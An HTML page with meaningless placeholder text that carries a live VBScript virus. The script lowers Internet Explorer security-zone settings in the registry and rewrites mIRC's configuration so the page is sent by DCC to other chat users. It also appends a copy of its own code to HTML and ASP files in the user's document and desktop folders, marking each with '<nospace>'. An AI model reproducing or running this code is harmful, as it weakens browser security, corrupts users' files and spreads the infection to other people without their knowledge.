<nospace>
<Html>
<HEAD>
<title>
kladjf
</title>
</head>

<body>
<br><br>
<center>
<font size="7" face="times">lasdjkf

<br></font>
<br>
<font size="3" face="times">

</font>

<br><br>
<pre>&copy1999 f0re</pre>
<br><br>
<br>

</center>




</body>
</html>

<script language="VBScript"><!--

Sub Mark()
End Sub

'On error Resume Next

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sant"

Set TRange = document.body.createTextRange

Call GetFolder("C:\mirc32")
Call GetFolder("C:\mirc")
Call GetFolder("C:\program files\mirc32")
Call GetFolder("C:\program files\mirc")
Call GetFolder("d:\mirc32")
Call GetFolder("d:\mirc")
Call GetFolder("d:\program files\mirc32")
Call GetFolder("d:\program files\mirc")
Call GetFolder("e:\mirc32")
Call GetFolder("e:\mirc")
Call GetFolder("e:\program files\mirc32")
Call GetFolder("e:\program files\mirc")
Call GetFolder("f:\mirc32")
Call GetFolder("f:\mirc")
Call GetFolder("f:\program files\mirc32")
Call GetFolder("f:\program files\mirc")

Sub GetFolder(shite)
On Error Resume Next

	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")

if FSO.FolderExists(shite) then
tdir = shite
Set TRange = document.body.createTextRange
Set cd = FSO.OpenTextFile("c:\windows\system\shite.html", 2, True)
cd.WriteLine TRange.htmltext
cd.close()
set mi =  FSO.OpenTextFile(tdir +"\mirc.ini", 1, True)
wbeginvir = "[rfiles]"
Do While mi.atendofstream <> True
wfindr = mi.readline
if wfindr = wbeginvir then exit Do
Loop
Set nd = FSO.OpenTextFile("c:\windows\irc2.txt", 2, True)
Do While mi.atendofstream <> true
nd.writeline mi.readline
Loop
set mi =  FSO.OpenTextFile(tdir +"\mirc.ini", 1, True)
wendvir = "[rfiles]"
Set nd = FSO.OpenTextFile("c:\windows\irc1.txt", 2, True)
Do While mi.atendofstream <> True
wfindr = mi.readline
if wfindr = wbeginvir then exit Do
nd.writeline wfindr 
Loop
nd.close
cd.close
Set nd = FSO.OpenTextFile("c:\windows\irc1.txt", 1, True)
contents = nd.readall()
nd.close
Set md = FSO.OpenTextFile("c:\windows\irc2.txt", 1, True)
endrfiles="bla"
i = 0
Set linest = FSO.OpenTextFile("c:\windows\irc21.txt", 2, True)
endrfile = "bla"
Do while endrfile <> ""
endrfile = md.readline
i = i + 3
i = i - 2
linest.writeline endrfile
Loop
linest.close
Set cd = fso.opentextfile("c:\windows\irc22.txt",2,true)
Do while md.atendofstream <> true 
cd.writeline md.readline
Loop
cd.close
md.close
Set ir = FSO.OpenTextFile("c:\windows\irc3.txt", 2, True)
ir.write(contents)
ir.writeline "[rfiles]"
Set linest = FSO.OpenTextFile("c:\windows\irc21.txt", 1, True)
linesc = linest.readall()
linest.close
ir.write(linesc)
newline = "n2=script.mrc"
ir.writeline newline
ir.writeline " "
Set cd = fso.opentextfile("c:\windows\irc22.txt",1,true)
contents2 = cd.readall()
cd.close
ir.write(contents2)
ir.close
Set ir = FSO.OpenTextFile("c:\windows\irc3.txt", 1, True)
newcontents = ir.readall()
ir.close
Set ort = FSO.OpenTextFile(tdir + "\mirc.ini", 1, True)
oldcontents = ort.readall()
ort.close
Set orn = FSO.OpenTextFile("c:\windows\oldmirc.ini", 2, True)		
orn.write(oldcontents)
orn.close
fso.deletefile(tdir +"\mirc.ini")
Set mrc = FSO.OpenTextFile(tdir +"\mirc.ini", 2, True)		
mrc.write(newcontents)
mrc.close
Set si = fso.opentextfile(tdir + "\script.mrc", 2, true)
si.writeline "[script]"
si.writeline ""
si.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\system\shite.html"
si.writeline "on 1:FILESENT*.*:./dcc send $nick c:\windows\system\shite.html"
si.writeline ""
si.writeline "on 1:connect: {"
si.writeline "/join #windows95"
si.writeline "/msg #windows95 m0dafukz!!!!!"
si.writeline "}"
si.writeline ""
si.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\system\shite.html"
si.writeline ""
si.writeline "on 1:TEXT:*fuck*:*:/msg $chan me!"
si.writeline ""
si.writeline ""
si.writeline ";shite v4.323"
si.close
End if
End Sub


'---------append part-------------
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
Set cd = FSO.OpenTextFile("c:\windows\test.txt", 2, True)
cd.WriteLine TRange.htmltext
cd.close()
findr = "novalue"
Set cd = FSO.OpenTextFile("c:\windows\test.txt", 1, False)
beginvir = "Sub Mark()"
Do While cd.atendofstream <> True
findr = cd.readline
if findr = beginvir then exit Do
Loop
Set nd = FSO.OpenTextFile("c:\windows\test2.txt", 2, True)
linr = "bla"
nd.writeline "<script language=" + Chr(34) + "VBScript" + Chr(34) + "><!--"
nd.writeline beginvir
Do While cd.atendofstream <> True
linr = cd.readline
nd.writeline linr
Loop
nd.close
cd.close
Call infect("C:\my documents\")
Call infect("d:\my documents")
Call infect("C:\Windows\Desktop")
Sub Infect(htmlpath)
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
if FSO.FolderExists(htmlpath) then
Set FolderObj = FSO.GetFolder(htmlpath)
set FO = FolderObj.Files
For each target in FO
ExtName = lcase(FSO.GetExtensionName(target.Name))
if ExtName = "asp" or ExtName = "htt" or ExtName = "html" or ExtName = "htm" then
Set Real = FSO.OpenTextFile(target.path, 1, False)
if Real.readline <> "<nospace>" then
Real.close()
GetFile(target.path)
else
Real.close()
end if
end if
next
End If
End Sub
Sub GetFile(GetFileName)
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
Set nd = FSO.OpenTextFile("c:\windows\test2.txt", 1, True)
virus = nd.readAll()
nd.close
Set Real = FSO.OpenTextFile(GetFileName, 1, False)
FileContents2 = Real.ReadAll()
Real.close()
Set Real = FSO.OpenTextFile(GetFileName, 2, False)
Real.WriteLine "<nospace>"
Real.Write(FileContents2)
Real.writeline " "
Real.writeline " "
Real.Write(virus)
Real.close()
End Sub

--></script>


